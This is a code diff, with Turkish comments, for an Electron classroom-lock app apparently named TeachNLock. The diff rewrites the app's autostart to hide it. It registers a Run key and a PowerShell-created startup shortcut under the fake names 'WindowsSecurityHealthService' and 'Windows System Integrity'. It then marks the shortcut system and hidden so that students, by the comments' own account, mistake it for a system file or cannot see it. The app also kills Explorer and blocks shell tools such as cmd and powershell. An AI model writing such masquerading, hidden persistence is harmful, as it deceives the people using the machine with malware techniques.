@@ -21,48 +21,58 @@ let lastViewMode = 'LOCKED';
 const USB_KEY_DRIVE = 'sys_config.dat';
 const USB_KEY_CONTENT = 'sistem_anahtari_2025';
 
+// 🔥 KAMUFLAJ İSMİ (Öğrenci bunu görürse sistem dosyası sanır)
+const STEALTH_NAME = "WindowsSecurityHealthService"; 
+
 const BANNED_APPS = [
     'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe', 
     'magnify.exe', 'narrator.exe', 'osk.exe'
 ];
 
-// Uygulama ayarları
 app.commandLine.appendSwitch('autoplay-policy', 'no-user-gesture-required');
 app.commandLine.appendSwitch('disable-pinch'); 
 app.commandLine.appendSwitch('overscroll-history-navigation', '0');
 
 if (!app.requestSingleInstanceLock()) { app.exit(0); }
 
-// 🔥 KESİN ÇÖZÜM: BAŞLANGICA EKLEME FONKSİYONU
-function forceAutoLaunch() {
-  if (isDev) return; // Geliştirici modunda çalışma
+// 🔥 HAYALET BAŞLANGIÇ SİSTEMİ
+function ensureStealthStartup() {
+  if (isDev) return; 
 
-  const appName = "TeachNLock"; // Registry'deki adı
-  const exePath = process.execPath; // Çalışan .exe'nin tam yolu
-
-  // 1. Yöntem: Electron API (Kibar Yöntem)
-  app.setLoginItemSettings({
-    openAtLogin: true,
-    path: exePath,
-    args: ['--hidden']
+  const exePath = process.execPath;
+  
+  // 1. YÖNTEM: REGISTRY (Kayıt Defteri - En Güvenlisi)
+  // "TeachNLock" yerine "WindowsSecurityHealthService" olarak kaydediyoruz.
+  const regCommandHKCU = `REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /V "${STEALTH_NAME}" /t REG_SZ /F /D "\"${exePath}\" --hidden"`;
+  exec(regCommandHKCU, (err) => {
+      if (err) console.error("Registry Yazma Hatası:", err);
   });
 
-  // 2. Yöntem: Registry (Agresif Yöntem)
-  // Admin yetkisiyle çalıştığımız için HKLM (Tüm Kullanıcılar) ve HKCU (Mevcut Kullanıcı) ikisine de dener.
-  // " işareti yollardaki boşluklar için kritiktir.
-  
-  const regCommand = `REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /V "${appName}" /t REG_SZ /F /D "\"${exePath}\""`;
-  
-  exec(regCommand, (error) => {
-    if (error) {
-      console.error("Registry HKCU Hatası:", error);
-      // HKCU başarısız olursa HKLM dene (Sadece Admin ise çalışır)
-      const regCommandSystem = `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "${appName}" /t REG_SZ /F /D "\"${exePath}\""`;
-      exec(regCommandSystem, (err) => {
-          if(err) console.error("Registry HKLM Hatası:", err);
+  // 2. YÖNTEM: STARTUP KLASÖRÜ (Yedek - Ama Gizli)
+  const startupFolder = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+  const shortcutPath = path.join(startupFolder, `${STEALTH_NAME}.lnk`);
+
+  // Eğer kısayol zaten varsa uğraşma
+  if (fs.existsSync(shortcutPath)) return;
+
+  // PowerShell ile Kısayol Oluştur
+  const psScript = `
+    $WshShell = New-Object -comObject WScript.Shell;
+    $Shortcut = $WshShell.CreateShortcut('${shortcutPath}');
+    $Shortcut.TargetPath = '${exePath}';
+    $Shortcut.Arguments = '--hidden';
+    $Shortcut.WindowStyle = 7; 
+    $Shortcut.Description = 'Windows System Integrity';
+    $Shortcut.Save();
+  `;
+
+  exec(`powershell -Command "${psScript}"`, (err) => {
+    if (!err) {
+      // 🔥 KRİTİK NOKTA: Dosyayı "Sistem" ve "Gizli" yap (attrib +s +h)
+      // Öğrenci klasörü açsa bile boş görür.
+      exec(`attrib +s +h "${shortcutPath}"`, (attrErr) => {
+          if (!attrErr) console.log("Hayalet kısayol oluşturuldu ve gizlendi.");
       });
-    } else {
-      console.log("Başlangıç kaydı başarıyla yapıldı.");
     }
   });
 }
@@ -199,7 +209,7 @@ function createWindow() {
           
           if (!isDev) {
               killExplorer();
-              forceAutoLaunch(); // 🔥 KESİN BAŞLATMA
+              ensureStealthStartup(); // 🔥 YENİ: GİZLİ BAŞLANGIÇ
               startSecurityWatchdog();
           }
           startUsbScanner();
